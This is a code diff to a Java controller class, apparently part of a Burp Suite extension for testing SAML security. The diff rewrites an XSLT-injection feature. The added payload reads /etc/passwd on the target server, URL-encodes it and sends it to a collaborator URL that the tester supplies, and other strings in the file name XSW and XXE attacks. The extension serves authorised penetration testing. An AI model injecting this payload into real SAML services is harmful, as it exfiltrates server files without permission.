@@ -16,9 +16,14 @@ import gui.SignatureHelpWindow;
 import gui.XSWHelpWindow;
 import helpers.XMLHelpers;
 import helpers.XSWHelpers;
-import java.awt.Component;
-import java.awt.Desktop;
-import java.awt.Toolkit;
+import model.BurpCertificate;
+import org.w3c.dom.*;
+import org.xml.sax.SAXException;
+
+import javax.xml.crypto.MarshalException;
+import javax.xml.crypto.dsig.XMLSignatureException;
+import javax.xml.parsers.ParserConfigurationException;
+import java.awt.*;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
 import java.io.File;
@@ -36,33 +41,23 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Observable;
 import java.util.Observer;
-import javax.xml.crypto.MarshalException;
-import javax.xml.crypto.dsig.XMLSignatureException;
-import javax.xml.parsers.ParserConfigurationException;
-import model.BurpCertificate;
-import org.w3c.dom.DOMException;
-import org.w3c.dom.Document;
-import org.w3c.dom.Element;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-import org.xml.sax.SAXException;
 
 import static java.util.Objects.requireNonNull;
 
 public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Observer {
 
-    private static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
-    private static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
-    private static final String XXE_CONTENT_APPLIED = "XXE content applied";
-    private static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
-    private static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
-    private static final String XML_NOT_SUITABLE_FOR_XLST = "This XML Message is not suitable for this particular XLST attack";
-    private static final String XML_COULD_NOT_SIGN = "Could not sign XML";
-    private static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
-    private static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
-    private static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
-    private static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
-    private static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";
+    public static final String XML_CERTIFICATE_NOT_FOUND = "X509 Certificate not found";
+    public static final String XSW_ATTACK_APPLIED = "XSW Attack applied";
+    public static final String XXE_CONTENT_APPLIED = "XXE content applied";
+    public static final String XML_NOT_SUITABLE_FOR_XXE = "This XML Message is not suitable for this particular XXE attack";
+    public static final String XSLT_CONTENT_APPLIED = "XSLT content applied";
+    public static final String XML_NOT_SUITABLE_FOR_XSLT = "This XML Message is not suitable for this particular XSLT attack";
+    public static final String XML_COULD_NOT_SIGN = "Could not sign XML";
+    public static final String XML_COULD_NOT_SERIALIZE = "Could not serialize XML";
+    public static final String XML_NOT_WELL_FORMED = "XML isn't well formed or binding is not supported";
+    public static final String XML_NOT_SUITABLE_FOR_XSW = "This XML Message is not suitable for this particular XSW, is there a signature?";
+    public static final String NO_BROWSER = "Could not open diff in Browser. Path to file was copied to clipboard";
+    public static final String NO_DIFF_TEMP_FILE = "Could not create diff temp file.";
 
     private final CertificateTabController certificateTabController;
     private XMLHelpers xmlHelpers;
@@ -433,6 +428,10 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
         samlGUI.getActionPanel().getInfoMessageLabel().setText(infoMessage);
     }
 
+    public String getInfoMessageText() {
+        return samlGUI.getActionPanel().getInfoMessageLabel().getText();
+    }
+
     private void resetInfoMessageText() {
         samlGUI.getActionPanel().getInfoMessageLabel().setText("");
     }
@@ -534,33 +533,45 @@ public class SamlTabController implements ExtensionProvidedHttpRequestEditor, Ob
     }
 
     public void applyXSLT(String collabUrl) {
-        String xslt = "\n" +
-                "<ds:Transform>\n" +
-                "  <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n" +
-                "    <xsl:template match=\"doc\">\n" +
-                "      <xsl:variable name=\"file\" select=\"'test'\"/>\n" +
-                "      <xsl:variable name=\"escaped\" select=\"encode-for-uri('$file')\"/>\n" +
-                "      <xsl:variable name=\"attackURL\" select=\"'" + collabUrl + "'\"/>\n" +
-                "      <xsl:variable name=\"exploitURL\" select=\"concat($attackerURL,$escaped)\"/>\n" +
-                "      <xsl:value-of select=\"unparsed-text($exploitURL)\"/>\n" +
-                "    </xsl:template>\n" +
-                "  </xsl:stylesheet>\n" +
-                "</ds:Transform>";
-        String transformString = "<ds:Transforms>";
-        int index = orgSAMLMessage.indexOf(transformString);
+        var prefixed = true;
+        var transformString = "<ds:Transforms>";
 
+        int index = orgSAMLMessage.indexOf(transformString);
         if (index == -1) {
-            setInfoMessageText(XML_NOT_SUITABLE_FOR_XLST);
-        } else {
-            int substringIndex = index + transformString.length();
-            String firstPart = orgSAMLMessage.substring(0, substringIndex);
-            String secondPart = orgSAMLMessage.substring(substringIndex);
-            samlMessage = firstPart + xslt + secondPart;
-            textArea.setContents(ByteArray.byteArray(samlMessage));
-            isEdited = true;
-            setRawMode(true);
-            setInfoMessageText(XSLT_CONTENT_APPLIED);
+            prefixed = false;
+            transformString = "<Transforms>";
         }
+
+        index = orgSAMLMessage.indexOf(transformString);
+        if (index == -1) {
+            setInfoMessageText(XML_NOT_SUITABLE_FOR_XSLT);
+            return;
+        }
+
+        var prefix = prefixed ? "ds:" : "";
+        var xslt = """
+                
+                <%sTransform>
+                  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+                    <xsl:template match="doc">
+                      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+                      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
+                      <xsl:variable name="attackerUrl" select="'%s'"/>
+                      <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
+                      <xsl:value-of select="unparsed-text($exploitUrl)"/>
+                    </xsl:template>
+                  </xsl:stylesheet>
+                </%sTransform>
+                """.formatted(prefix, collabUrl, prefix);
+
+        int substringIndex = index + transformString.length();
+        String firstPart = orgSAMLMessage.substring(0, substringIndex);
+        String secondPart = orgSAMLMessage.substring(substringIndex);
+        samlMessage = firstPart + xslt + secondPart;
+        textArea.setContents(ByteArray.byteArray(samlMessage));
+        isEdited = true;
+        setRawMode(true);
+        setInfoMessageText(XSLT_CONTENT_APPLIED);
     }
 
     public synchronized void addMatchAndReplace(String match, String replace) {
